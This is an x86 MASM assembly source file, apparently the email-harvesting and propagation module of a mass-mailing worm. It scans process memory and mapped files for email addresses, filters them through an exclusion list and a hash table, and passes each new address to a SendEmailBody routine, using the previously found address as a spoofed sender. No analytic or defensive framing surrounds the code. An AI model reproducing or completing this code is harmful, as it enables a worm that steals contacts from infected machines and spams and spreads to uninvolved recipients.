; Email scanner module, scans emails in memory or files
; -----------------------------------------------------

.data
        szEmailExclude  db   0   
		include mails.inc
			db   0

.data?
        lpHashTable     dd      ?
        PrevEmail       db      1024 dup(?)

.code

EmailScanLeft proc uses esi ebx min: DWORD
        mov     ebx, esi
        dec     esi
        dec     esi
        mov     cl, 1
        std
@loop:
        .IF     esi >= min
                lodsb
                .IF     ((al >= '0') && (al <= '9')) || ((al >= 'A') && (al <= 'Z')) || ((al >= 'a') && (al <= 'z')) || (al == '.') || (al == '_') || (al == '-') || ((al == 0) && (cl != 0))
                        mov     ebx, esi
                        inc     ebx
                        mov     cl, al
                        jmp     @loop
                .ENDIF
        .ENDIF        
        cld
        mov     eax, ebx
        ret
EmailScanLeft endp

EmailScanRight proc uses esi ebx max: DWORD
        mov     ebx, esi
        cld
        mov     cl, 1
@loop:
        .IF     esi < max
                lodsb
                .IF     ((al >= '0') && (al <= '9')) || ((al >= 'A') && (al <= 'Z')) || ((al >= 'a') && (al <= 'z')) || (al == '.') || (al == '_') || (al == '-') || ((al == 0) && (cl != 0))
                        mov     ebx, esi
                        mov     cl, al
                        jmp     @loop
                .ENDIF
        .ENDIF        
        mov     eax, ebx
        ret
EmailScanRight endp

EmailCheckLeft proc A, B: DWORD
        mov     eax, B
        sub     eax, A
        cmp     eax, 2
        jl      @check_false
        mov     eax, 1
        ret
@check_false:
        xor     eax, eax
        ret
EmailCheckLeft endp

EmailCheckRight proc A, B: DWORD
        invoke  StrRChr, A, NULL, '.'
        .IF     eax
                invoke  lstrlen, eax
                .IF     eax <= 2
                        xor     eax, eax
                .ELSE
                        mov     eax, 1
                .ENDIF
        .ENDIF
        ret
EmailCheckRight endp

; Harvest emails in memory
EmailScanMem proc uses esi edi ebx lpMem, dwLen, AddFunc: DWORD
        LOCAL   min, max: DWORD
        LOCAL   len: DWORD
        LOCAL   copy[500]: BYTE

        mov     len, 0

        mov     esi, lpMem
        mov     min, esi
        m2m     max, dwLen
        add     max, esi

@loop3:
        .IF     esi < max
                inc     len
                .IF     len == 10000
                        invoke Sleep, 1
                        mov     len, 0
                .ENDIF
                cld
                lodsb
                .IF     al == '@'
                        push    esi
                        
                        ; Get left offset
                        invoke  EmailScanLeft, min
                        mov     ebx, eax

                        ; Get right offset
                        invoke  EmailScanRight, max

                        ; Delta offset (length)
                        mov     ecx, eax
                        sub     ecx, ebx
                        .IF     (ecx < 500) && (ecx > 5)
                                cld
                                mov     esi, ebx
                                lea     edi, copy
                                xor     edx, edx

                        @eml_cpy:
                                lodsb
                                .IF     al
                                        stosb
                                        .IF     al == '@'
                                                mov     edx, edi
                                        .ENDIF
                                .ENDIF
                                loop    @eml_cpy

                                ; Write NULL
                                xor     eax, eax
                                stosb

                                .IF     edx
                                        push    edx
                                        invoke  lstrlen, addr copy
                                        pop     edx
                                        .IF     eax > 5
                                                invoke  EmailCheckLeft, addr copy, edx
                                                mov     ebx, eax
                                                invoke  EmailCheckRight, edx, edi
                                                and     ebx, eax

                                                .IF     ebx
                                                        lea     eax, copy
                                                        push    eax
                                                        call    AddFunc
                                                .ENDIF
                                        .ENDIF
                                .ENDIF

                        .ENDIF
                        pop     esi
                .ENDIF
                jmp     @loop3
        .ENDIF

        ret
EmailScanMem endp

; Harvest emails from szFileName
EmailScanFile proc uses ebx szFileName, AddFunc: DWORD
        LOCAL   hFile, dwFileSize: DWORD

        invoke  CreateFile, szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0
        mov     hFile, eax
        inc     eax
        jz      @file_open_error
        invoke  GetFileSize, hFile, 0
        mov     dwFileSize, eax
        inc     eax
        jz      @file_open_close
        invoke  CreateFileMapping, hFile, NULL, PAGE_READONLY, 0, 0, NULL
        .IF     eax
                mov     ebx, eax
                invoke  MapViewOfFile, eax, FILE_MAP_READ, 0, 0, 0
                .IF     eax
                        push    eax
                        invoke  EmailScanMem, eax, dwFileSize, AddFunc
                        call    UnmapViewOfFile
                .ENDIF
                invoke  CloseHandle, ebx
        .ENDIF
@file_open_close:
        invoke  CloseHandle, hFile
@file_open_error:
        ret
EmailScanFile endp

; Initialize scanner, should be called first
EmailScanInit proc
        invoke  HashTableInit, offset lpHashTable, 5000
        lea     eax, PrevEmail
        mov     byte ptr[eax], 0
        ret
EmailScanInit endp

; Returns 0 if email should be excluded
CheckEmailExclude proc uses edi szEmail: DWORD
        mov     edi, offset szEmailExclude

@next:
        invoke  StrStrI, szEmail, edi
        .IF     eax
                xor     eax, eax
                ret
        .ENDIF

        mNextListEntry @next

        mov     eax, 1
        ret
CheckEmailExclude endp

EmailAddToQueue proc szEmail: DWORD
        invoke  CheckEmailExclude, szEmail
        .IF     !eax
                ret
        .ENDIF
        invoke  CalcStrHash, szEmail
        invoke  HashTableAdd, offset lpHashTable, 5000, eax
        .IF     eax
                lea     eax, PrevEmail
                .IF     byte ptr[eax]
                        invoke  SendEmailBody, eax, szEmail
                .ELSE
                        invoke  SendEmailBody, szEmail, szEmail
                .ENDIF
                ; Set prev email
                invoke  lstrcpy, offset PrevEmail, szEmail
        .ENDIF
        ret
EmailAddToQueue endp
